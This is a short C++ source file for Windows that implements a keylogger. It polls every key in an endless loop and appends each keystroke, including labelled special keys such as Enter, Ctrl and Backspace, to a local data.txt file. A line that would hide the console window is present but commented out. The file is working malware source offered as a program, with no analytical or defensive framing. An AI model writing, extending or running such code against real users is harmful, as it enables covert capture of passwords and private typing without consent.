#include <iostream>
#include <fstream>
#include <Windows.h>
using namespace std;

//functions used:
void AddKey(string input);
bool SpecialCases(int key);


int main()
{
	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	char InputChar;

	for (;;)
	{
		Sleep(10);
		for (int InputChar=8; InputChar<= 220; InputChar++)
		{
			if (GetAsyncKeyState(InputChar) == -32767) 
			{
				if (SpecialCases(InputChar) == false)
				{
					fstream DataLog;
					DataLog.open("data.txt", fstream::app);

					if (DataLog.is_open())
					{
						DataLog << char(InputChar);
						DataLog.close();
					}
				}
			}
		}
	}
}

	


//Pretty self explanatory. File is opened and the string inputted is entered.
//Since its still an initial phase it will only print "hi" into the txt accordng to main.
void AddKey(string input)
{
	fstream DataLog;
	DataLog.open("data.txt", fstream::app);

	if (DataLog.is_open())
	{
		DataLog << input;
		DataLog.close();
	}
}

//Here we can find all the special cases keys. For example, the period key
//would not show up proberly in the log. This function fixes it all.
bool SpecialCases(int key)
{
	switch (key) 
	{

	//Period key ( '.' )
	case 0xBE:
		AddKey(".");
		return true;

	//comma key ( ',' )
	case 0xBC:
		AddKey(",");
		return true;

	//Spacebar
	case 0x20:
		AddKey(" ");
		return true;

	//Enter Key
	case 0x0D:
		AddKey("(enter_key)");
		return true;

	//Backspace Key:
	case 0x08:
		AddKey("(backspace_key)");
		return true;

	//Ctrl Key
	case 0x11:
		AddKey("(ctrl_key)");
		return true;

	//ALT key
	case 0x12:
		AddKey("(alt_key)");
		return true;

	//Left Windows Key:
	case 0x5B:
		AddKey("(left_windows_key)");
		return true;

	//Right Windows Key:
	case 0x5C:
		AddKey("(right_windows_key)");
		return true;

	//Shift Key:
	case 0x10:
		AddKey("(shift_key)");
		return true;

	//Caps Lock Key:
	case 0x14:
		AddKey("(caps_lock)");
		return true;

	//Tab Key
	case 0x09:
		AddKey("(tab_key)");
		return true;
	
	//Up arrow key
	case 0x26:
		AddKey("(up_arrow)");
		return true;

	//Down arrow key:
	case 0x28:
		AddKey("(down_arrow)");
		return true;

	//Left arrow key:
	case 0x25:
		AddKey("(left_arrow)");
		return true;

	//Right arrow key:
	case 0x27:
		AddKey("(right_arrow)");
		return true;

	default: 
		return false;
	}
}